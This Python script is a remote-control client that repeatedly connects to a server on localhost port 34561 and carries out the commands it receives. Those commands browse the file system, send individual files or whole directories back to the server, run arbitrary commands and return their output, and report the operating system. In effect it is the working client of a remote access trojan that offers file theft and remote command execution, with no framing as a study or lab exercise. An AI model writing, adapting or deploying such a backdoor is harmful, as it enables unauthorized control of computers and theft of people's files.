import os
import subprocess
import time
from hashlib import sha256
from pathlib import Path
from socket import *

server_name = 'localhost'
server_port = 34561
current_path = Path.home()
slash = '/' if os.name != 'nt' else '\\'


def ls():
    print('List directory requested')
    list_dir = os.walk(current_path)
    for root, dirs, files in list_dir:
        for dir in dirs:
            clientSocket.send(dir.encode())
            time.sleep(0.1)

        clientSocket.send('/'.encode())

        for file in files:
            clientSocket.send(file.encode())
            time.sleep(0.1)

        clientSocket.send('.'.encode())
        break


def cdup():
    print('Change to parent directory requested')
    global current_path
    current_path = str(Path(current_path).parent)
    clientSocket.send(current_path.encode())


def cdhome():
    global current_path
    print('Change directory to home requested')
    current_path = Path.home()
    clientSocket.send(str(current_path).encode())


def cd():
    global current_path
    print('Join directory requested')
    path = clientSocket.recv(1024).decode()
    try:
        if os.path.exists(str(current_path) + slash + path):
            current_path = str(current_path) + slash + path
            os.chdir(current_path)
            clientSocket.send(current_path.encode())
        else:
            raise FileNotFoundError
    except FileNotFoundError:
        print('Path not found')
        clientSocket.send('Path not found'.encode())


def pwd():
    print('Working directory requested')
    clientSocket.send(str(current_path).encode())


def get():
    print('Get file requested')
    file_name = clientSocket.recv(1024).decode()
    print('Downloading file ' + file_name)
    send(file_name)


def getall():
    print('Get directory file requested')
    list_dir = os.walk(current_path)
    for root, dirs, files in list_dir:
        for file in files:
            clientSocket.send(file.encode())
            if not send(file):
                clientSocket.send('.'.encode())
                return

            time.sleep(0.1)
            if clientSocket.recv(1024).decode() == 'ok':
                continue

        clientSocket.send('.'.encode())
        break


def send(fname):
    try:
        if not os.path.exists(str(current_path) + slash + fname):
            print('File not found')
            clientSocket.send('File not found'.encode())
            return False

        file = open(fname, 'rb')
        file_size = os.path.getsize(fname)
        file_hash = sha256(open(fname, 'rb').read()).hexdigest()
        clientSocket.send(str(file_size).encode())
        clientSocket.recv(1024).decode()
        clientSocket.send(str(file_hash).encode())
        clientSocket.recv(1024).decode()
        data = file.read()
        clientSocket.sendall(data)
        file.close()
        return True
    except OSError:
        print('Permission denied')
        clientSocket.send('Permission denied'.encode())
        return False


def command():
    print('Subprocess requested')
    command = clientSocket.recv(1024).decode()
    print('Executing command ' + command)
    try:
        output = subprocess.run(command, capture_output=True,
                                text=True, check=True, shell=False, timeout=10, encoding='utf-8', errors='ignore')
        if str(output.stdout) != '':
            clientSocket.send(str(len(output.stdout)).encode())
            clientSocket.sendall(str(output.stdout).encode())
        else:
            clientSocket.send('No Output'.encode())
    except subprocess.TimeoutExpired:
        print('Command timeout')
        clientSocket.send('Command timeout'.encode())
    except OSError:
        print('Command not found')
        clientSocket.send('Command not found'.encode())


def platform():
    print('Platform requested')
    getos = os.name
    if getos == 'nt':
        clientSocket.send('Windows'.encode())
    elif getos == 'posix':
        clientSocket.send('Linux'.encode())
    else:
        clientSocket.send('Unknown'.encode())


switcher = {
    'ls': ls,
    'pwd': pwd,
    'get': get,
    'getall': getall,
    'cdup': cdup,
    'cdhome': cdhome,
    'cd': cd,
    'command': command,
    'platform': platform}

connected = False
while True:

    while not connected:
        try:
            clientSocket = socket(AF_INET, SOCK_STREAM)
            clientSocket.connect((server_name, server_port))
            connected = True
            print("re-connection successful")

        except ConnectionRefusedError:
            print('Server not available')
            connected = False
            time.sleep(10)

    while connected:
        try:
            command = clientSocket.recv(1024).decode()
            if command in switcher.keys() and command != '':
                print('Command received: ', command)
                switcher[command]()
        except ConnectionError:
            print('Server disconnected')
            clientSocket.shutdown(SHUT_RDWR)
            clientSocket.close()
            connected = False
            time.sleep(10)
            os.system('cls')